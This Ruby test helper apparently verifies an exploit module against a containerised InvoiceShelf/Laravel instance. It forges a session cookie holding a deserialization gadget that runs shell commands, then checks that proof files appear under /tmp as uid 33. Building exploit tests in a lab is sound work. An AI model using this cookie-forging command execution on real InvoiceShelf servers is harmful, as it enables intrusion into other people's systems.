# frozen_string_literal: true

require 'net/http'
require 'http/cookie'
require 'shellwords'
require_relative '../rsync_creds/native'

# The genuine Laravel runtime creates independent ciphertext and object lengths.
module InvoiceShelfTarget
  include RsyncCredentialTarget

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'invoiceshelf-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def native(mode, data, label)
    command = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'php', '/opt/module-target-native.php', mode]
    output, error, status = Open3.capture3(*command, stdin_data: JSON.generate(data))
    @rc[:native] << { label: label, mode: mode, input: data, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def http(path, headers = {})
    endpoint = target_endpoint('target')
    uri = URI::HTTP.build(host: endpoint.fetch('host'), port: endpoint.fetch('port'), path: path)
    client = Net::HTTP.new(uri.hostname, uri.port, nil)
    client.open_timeout = 5
    client.read_timeout = 10
    response = client.start { |connection| connection.request(Net::HTTP::Get.new(uri, headers)) }
    @rc[:http] << { path: path, code: response.code.to_i, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    rc_save
    response
  end

  def file(path)
    program = 'echo json_encode(["exists"=>file_exists($argv[1]),"uid"=>file_exists($argv[1])?fileowner($argv[1]):null,"base64"=>file_exists($argv[1])?base64_encode(file_get_contents($argv[1])):null]);'
    output, = rc_command('proof-file', 'target', 'php', '-r', program, path)
    JSON.parse(output)
  end

  def native_command(command, path, content)
    expect(file(path)).to include('exists' => false)
    uri = URI::HTTP.build(host: target_endpoint('target').fetch('host'), port: target_endpoint('target').fetch('port'), path: '/login')
    response = http('/login')
    expect(response.code).to eq('200')
    cookies = response.get_fields('set-cookie').flat_map { |header| HTTP::Cookie.parse(header, uri) }.to_h { |cookie| [cookie.name, cookie.value] }
    cookie_name = @native.fetch('cookie')
    session = native('cookie', { name: cookie_name, value: cookies.fetch(cookie_name) }, 'native-session')
    expect(session.fetch('prefix_valid')).to be(true)
    name = session.fetch('value')
    expect(cookies).to have_key(name)
    generated = native('gadget', { name: name, command_base64: Base64.strict_encode64(command.b) }, 'native-gadget')
    expect(file(path)).to include('exists' => false)
    expect(http('/login', 'Cookie' => cookie_name + '=' + cookies.fetch(cookie_name) + '; ' + name + '=' + generated.fetch('value')).code).to eq('200')
    expect(file(path)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(content.b))
  ensure
    rc_command('remove-native-proof', 'target', 'rm', '-f', '--', path)
    expect(file(path)).to include('exists' => false)
  end

  def native_verify(label, driver: 'cookie', cookie: 'laravel_session')
    data = native('verify', {}, label)
    expect(data).to include('php' => '8.3.33', 'laravel' => '10.48.16', 'uid' => 33, 'driver' => driver, 'cookie' => cookie, 'serialization' => 'php', 'handler' => 'Illuminate\\Session\\' + (driver == 'file' ? 'FileSessionHandler' : 'CookieSessionHandler'), 'database' => 'sqlite', 'users' => 1, 'companies' => 1, 'invoices' => 0, 'php_supported' => true)
    expect(data.fetch('requirements')).not_to have_key('errors')
    expect(data.fetch('sqlite').fetch('supported')).to be(true)
    expect(data.fetch('source_sha256')).to eq(JSON.parse(File.read('test/module_targets/invoiceshelf/vendor.json')).fetch('source_sha256'))
    data
  end

  def command_case(label, content, target: 1, payload: 'cmd/unix/generic', extra: {})
    2.times do |iteration|
      path = "/tmp/module-target-invoiceshelf-owner-#{Process.pid}-#{label}-#{iteration}"
      command = 'printf %s ' + Shellwords.escape(content) + ' >> ' + path
      native_command(command, path, content)
      console_command('back') if iteration.zero?
      console_command('use ' + InvoiceShelfObservation::OWNER) if iteration.zero?
      # Datastore assignment preserves physical LF/CR bytes across the console.
      rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")
      options = { 'TARGET' => target, 'PAYLOAD' => payload, 'AutoCheck' => iteration.zero?, 'ForceExploit' => false, 'SSL' => false, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'HttpClientTimeout' => 10 }.merge(extra)
      offset = rc_json('framework.instance_variable_get(:@invoiceshelf_events).length')
      output = run_target_module(InvoiceShelfObservation::OWNER, 'target', options, action: 'run -z', reuse_module: true, allow_errors: true)
      selected = rc_json('active_module.object_id')
      expect(selected).to eq(@selected_owner) if iteration.positive?
      @selected_owner = selected
      events = rc_json("framework.instance_variable_get(:@invoiceshelf_events).drop(#{offset})")
      @rc[:calls] << { label: label, iteration: iteration, output: output, selection: selected, options: options, command_base64: Base64.strict_encode64(command.b), events: events }
      rc_save
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      actual = rc_poll(5) do
        value = file(path)
        value if value.fetch('exists')
      end
      expect(actual).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(content.b))
    ensure
      rc_command('remove-owner-proof', 'target', 'rm', '-f', '--', path)
      expect(file(path)).to include('exists' => false)
      rc_save
    end
  end
end
